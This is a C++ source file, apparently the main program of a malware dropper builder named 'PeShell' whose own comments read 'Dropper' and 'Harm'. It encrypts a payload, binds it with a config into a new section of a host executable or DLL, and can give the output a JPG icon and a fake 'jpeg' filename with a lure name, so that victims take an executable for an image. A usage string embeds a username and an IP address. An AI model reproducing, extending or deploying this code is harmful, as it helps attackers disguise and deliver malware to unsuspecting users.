
//http://www.virustotal.com
//http://www.virscan.org
//Dropper 
//Harm

#include <windows.h>
#include <stdio.h>
#include "Section.h"
#include "Resource.h"
#include "FakeFilename.h"
#include "SetIcon.h"
#include <stdlib.h>
#include "Public.h"
#include <string.h>
#include "crypto.h"
#include "test.h"

#define _CONSOLE

#ifdef _CONSOLE
int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp) {

#ifdef _DEBUG
	test();
#endif

	int ret = 0;
	printf("example:PeShell -be sogou.exe sbiedll.dll -c config.dat -o out.exe\r\n");
	printf("example:PeShell -be sogou.exe sbiedll.dll -p [username:jy20200729][ip:47.116.51.29] -o out.exe\r\n");
	printf("example:PeShell -bd sogou.exe sbiedll.dll -c config.dat -o out.dll\r\n");
	printf("example:PeShell -ber sogou.exe sbiedll.dll -c config.dat -o out.exe\r\n");
	printf("example:PeShell -e sogou.exe -c config.dat -o out.exe\r\n");
	printf("example:PeShell -d sbiedll.dll -c config.dat -o out.dll\r\n");

	if (argc < 3)
	{
		printf("param error\r\n");
		getchar();
		return -1;
	}


	string curpath = Public::getCurPath();
	ret = SetCurrentDirectoryA(curpath.c_str());

#define MAX_FILE_COUNT 16
	char filelist[MAX_FILE_COUNT][256];
	memset(filelist, 0, MAX_FILE_COUNT * 256);
	int iFlag = 0;
	int paramscnt = 0;
	char szoutFn[MAX_PATH] = { 0 };
	string dstcryptfn = "test.dat";
	string dstcfgfn = "config.dat";

	for (int i = 1;i < argc; )
	{
		if (lstrcmpiA(argv[i],"-be") == 0)
		{
			iFlag = 3;
			for (int j=i+1,k = 0;k < 2;j ++,k++)
			{
				lstrcpyA(filelist[k], argv[j]);
				paramscnt++;
			}
			i += 3;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-bd") == 0)
		{
			iFlag = 4;
			for (int j = i + 1, k = 0; k < 2; j++,k++)
			{
				lstrcpyA(filelist[k], argv[j]);
				paramscnt++;
			}

			i += 3;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-dh") == 0)
		{
			iFlag = 4;
			Crypto::cryptPayloadFile(argv[i+1], dstcryptfn);
			lstrcpyA(filelist[paramscnt], dstcryptfn.c_str());
			paramscnt++;
			i += 2;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-eh") == 0)
		{
			iFlag = 3;
			Crypto::cryptPayloadFile(argv[i+1], dstcryptfn);
			lstrcpyA(filelist[paramscnt], dstcryptfn.c_str());
			paramscnt++;
			i += 2;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-e") == 0)
		{
			iFlag = 1;
			lstrcpyA(filelist[0], argv[i+1]);
			paramscnt++;
			i += 2;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-d")==0)
		{
			iFlag = 2;
			lstrcpyA(filelist[0], argv[i+1]);
			paramscnt++;
			i += 2;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-o")==0)
		{
			lstrcpyA(szoutFn, argv[i + 1]);
			i += 2;
			continue;
		}
		else if (lstrcmpiA(argv[i], "-c") == 0)
		{
			Public::prepareCfg(argv[i+1], dstcfgfn);
			lstrcpyA(filelist[paramscnt], dstcfgfn.c_str());
			paramscnt++;

			i += 2;
			continue;
		}else if (lstrcmpiA(argv[i], "-p") == 0)
		{
			lstrcpyA(filelist[paramscnt], "config.dat");
			paramscnt++;

			Public::prepareParams(argv[i + 1],argv[i+2],dstcfgfn);

			i += 3;
			continue;
		}

		i++;
	}

	char szSegName[] = { '.','l','d','a','t','a',0 };
	string resultfn = Section::insertSection(iFlag, szSegName, filelist, paramscnt,szoutFn);
	if (resultfn == "")
	{
		printf("something error happened\r\n");
		getchar();
		return -1;
	}
	
	if (strstr(argv[1], "r")) {
		ChangeIcon(resultfn.c_str(), "jpg.ico");
		FakeFilename::fakefn(resultfn,"jpeg","香港之路");
	}

	printf("work complete\r\n");
	ExitProcess(0);
	return 0;
}
#else
int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmode) {
	HANDLE h = GetModuleHandle(0);
	return 0;
}
#endif


#include "Resource.h"

//array[x][y]在内存中是随着内存地址递增的,array[x] array[x+1] 差是16，why?
//*[]结构是指针数组
//*是数组，也就是存放地址的变量

void test() {


	Resource::getResource((DWORD)GetModuleHandle(0),"");
	return;
}